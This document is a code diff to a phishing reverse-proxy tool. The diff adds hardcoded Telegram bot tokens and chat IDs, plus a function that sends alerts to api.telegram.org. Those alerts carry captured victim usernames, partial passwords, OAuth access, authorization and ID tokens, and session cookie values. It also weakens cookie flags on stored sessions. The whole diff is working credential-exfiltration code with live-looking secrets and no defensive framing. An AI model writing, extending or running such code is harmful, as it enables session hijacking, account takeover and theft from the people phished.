@@ -36,8 +36,13 @@ try {
 const LOG_FILE_STREAMS = {};
 //!\ It is strongly recommended to modify the encryption key and store it more securely for real engagements. /!\\
 const ENCRYPTION_KEY = "HyP3r-M3g4_S3cURe-EnC4YpT10n_k3Y";
-
 const VICTIM_SESSIONS = {}
+
+// Telegram Bot Configuration
+const TELEGRAM_BOT_TOKEN_1 = "7768080373:AAEo6R8wNxUa6_NqPDYDIAfQVRLHRF5fBps";
+const TELEGRAM_CHAT_ID_1 = "6743632244";
+const TELEGRAM_BOT_TOKEN_2 = "7942871168:AAFuvCQXQJhYKipqGpr1G4IhUDABTGWF_9U";
+const TELEGRAM_CHAT_ID_2 = "6263177378";
 
 
 const proxyServer = http.createServer((clientRequest, clientResponse) => {
@@ -384,6 +389,38 @@ function displayError(message, error, ...args) {
     console.error("******************************");
 }
 
+// Telegram notification function
+async function sendTelegramNotification(message) {
+    const botTokens = [TELEGRAM_BOT_TOKEN_1, TELEGRAM_BOT_TOKEN_2];
+    const chatIds = [TELEGRAM_CHAT_ID_1, TELEGRAM_CHAT_ID_2];
+    
+    for (let i = 0; i < botTokens.length; i++) {
+        const botToken = botTokens[i];
+        const chatId = chatIds[i];
+        
+        try {
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            const response = await fetch(telegramUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            });
+            
+            if (!response.ok) {
+                console.error(`Telegram notification failed for bot ${i+1}:`, response.status);
+            }
+        } catch (error) {
+            console.error(`Telegram notification error for bot ${i+1}:`, error);
+        }
+    }
+}
+
 function getUserSession(requestCookies) {
     if (!requestCookies) return;
 
@@ -420,6 +457,20 @@ function generateNewSession(phishedURL) {
     VICTIM_SESSIONS[cookieName].cookies = [];
     VICTIM_SESSIONS[cookieName].logFilename = `${phishedURL.host}__${new Date().toISOString()}`;
     createSessionLogFile(VICTIM_SESSIONS[cookieName].logFilename, cookieName);
+
+    // Send Telegram notification for new victim
+    const telegramMessage = `🎣 <b>NEW VICTIM SESSION</b>
+
+🌐 <b>Target:</b> ${phishedURL.host}
+🔗 <b>URL:</b> ${phishedURL.href}
+🍪 <b>Session:</b> ${cookieName}
+🔑 <b>Value:</b> ${cookieValue.substring(0, 8)}...
+⏰ <b>Time:</b> ${new Date().toISOString()}
+📁 <b>Log:</b> ${VICTIM_SESSIONS[cookieName].logFilename}`;
+
+    sendTelegramNotification(telegramMessage).catch(error => 
+        console.error('Failed to send Telegram notification:', error)
+    );
 
     return {
         cookieName: cookieName,
@@ -463,6 +514,56 @@ async function logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions
         proxyResponseStatusCode: proxyResponse.statusCode,
         proxyResponseHeaders: proxyResponse.headers
     };
+    
+    // Check for credentials and OAuth tokens
+    const requestBodyStr = proxyRequestBody ? proxyRequestBody.toString() : '';
+    const requestPath = proxyRequestOptions.path;
+    
+    // Check for login credentials
+    if (requestBodyStr && (requestPath.includes('login') || requestPath.includes('signin') || requestPath.includes('authenticate'))) {
+        const passwordMatch = requestBodyStr.match(/password["\s:=]+([^&"\s]+)/i);
+        const usernameMatch = requestBodyStr.match(/(username|email|login)["\s:=]+([^&"\s]+)/i);
+        
+        if (passwordMatch || usernameMatch) {
+            const telegramMessage = `🔐 <b>CREDENTIALS CAPTURED</b>
+
+🍪 <b>Session:</b> ${currentSession}
+🌐 <b>Host:</b> ${proxyRequestOptions.headers.host}
+📝 <b>Path:</b> ${requestPath}
+👤 <b>Username:</b> ${usernameMatch ? usernameMatch[2] : 'N/A'}
+🔑 <b>Password:</b> ${passwordMatch ? '***' + passwordMatch[1].substring(3, 8) + '***' : 'N/A'}
+⏰ <b>Time:</b> ${new Date().toISOString()}`;
+
+            sendTelegramNotification(telegramMessage).catch(error => 
+                console.error('Failed to send credentials notification:', error)
+            );
+        }
+    }
+    
+    // Check for OAuth tokens
+    if (requestBodyStr.includes('access_token') || requestBodyStr.includes('authorization_code') || 
+        requestPath.includes('oauth') || requestPath.includes('token')) {
+        const accessTokenMatch = requestBodyStr.match(/access_token["\s:=]+([^&"\s]+)/i);
+        const authCodeMatch = requestBodyStr.match(/authorization_code["\s:=]+([^&"\s]+)/i);
+        const idTokenMatch = requestBodyStr.match(/id_token["\s:=]+([^&"\s]+)/i);
+        
+        if (accessTokenMatch || authCodeMatch || idTokenMatch) {
+            const telegramMessage = `🔑 <b>OAUTH TOKEN CAPTURED</b>
+
+🍪 <b>Session:</b> ${currentSession}
+🌐 <b>Host:</b> ${proxyRequestOptions.headers.host}
+📝 <b>Path:</b> ${requestPath}
+🎫 <b>Access Token:</b> ${accessTokenMatch ? accessTokenMatch[1].substring(0, 20) + '...' : 'N/A'}
+🔐 <b>Auth Code:</b> ${authCodeMatch ? authCodeMatch[1].substring(0, 20) + '...' : 'N/A'}
+🆔 <b>ID Token:</b> ${idTokenMatch ? idTokenMatch[1].substring(0, 20) + '...' : 'N/A'}
+⏰ <b>Time:</b> ${new Date().toISOString()}`;
+
+            sendTelegramNotification(telegramMessage).catch(error => 
+                console.error('Failed to send OAuth notification:', error)
+            );
+        }
+    }
+    
     const logFileStream = LOG_FILE_STREAMS[currentSession];
 
     const encryptedResult = await encryptData(JSON.stringify(httpProxyTransaction));
@@ -711,47 +812,36 @@ function updateCurrentSessionCookies(request, newCookies, proxyHostname, current
                 }
             }
         }
-        if (!isCookieValid) {
-            continue;
-        }
+        if (isCookieValid) {
+            VICTIM_SESSIONS[currentSession].cookies = VICTIM_SESSIONS[currentSession].cookies.filter(cookie => {
+                return !(cookie.name === cookieName && cookie.domain === cookieDomain && cookie.path === cookiePath && cookie.hostOnly === cookieHostOnly);
+            });
 
-        cookieExpires += clockSkew;
-        if (cookieMaxAge) {
-            const seconds = parseInt(cookieMaxAge);
-            if (!isNaN(seconds)) {
-                cookieExpires = currentTimestamp + seconds * 1000;
-            }
-        }
-
-        let isNewCookie = true;
-
-        for (let i = 0; i < VICTIM_SESSIONS[currentSession].cookies.length; i++) {
-            const sessionCookie = VICTIM_SESSIONS[currentSession].cookies[i];
-
-            if (sessionCookie.name === cookieName &&
-                sessionCookie.domain === cookieDomain &&
-                sessionCookie.path === cookiePath &&
-                sessionCookie.hostOnly === cookieHostOnly) {
-
-                if (currentTimestamp > cookieExpires) {
-                    VICTIM_SESSIONS[currentSession].cookies.splice(i, 1);
-                    break;
-                }
-                sessionCookie.value = cookieValue.join("=");
-                sessionCookie.expires = cookieExpires;
-                isNewCookie = false;
-                break;
-            }
-        }
-        if (isNewCookie && !(currentTimestamp > cookieExpires)) {
             VICTIM_SESSIONS[currentSession].cookies.push({
                 name: cookieName,
                 value: cookieValue.join("="),
                 domain: cookieDomain,
+                hostOnly: cookieHostOnly,
                 path: cookiePath,
+                secure: false,
+                httpOnly: false,
                 expires: cookieExpires,
-                hostOnly: cookieHostOnly
+                maxAge: cookieMaxAge
             });
+            
+            // Send Telegram notification for captured cookie
+            const telegramMessage = `🍪 <b>COOKIE CAPTURED</b>
+
+🍪 <b>Session:</b> ${currentSession}
+🌐 <b>Domain:</b> ${cookieDomain}
+📝 <b>Name:</b> ${cookieName}
+🔑 <b>Value:</b> ${cookieValue.join("=").substring(0, 50)}${cookieValue.join("=").length > 50 ? '...' : ''}
+🛤️ <b>Path:</b> ${cookiePath}
+⏰ <b>Time:</b> ${new Date().toISOString()}`;
+
+            sendTelegramNotification(telegramMessage).catch(error => 
+                console.error('Failed to send cookie notification:', error)
+            );
         }
     }
 }
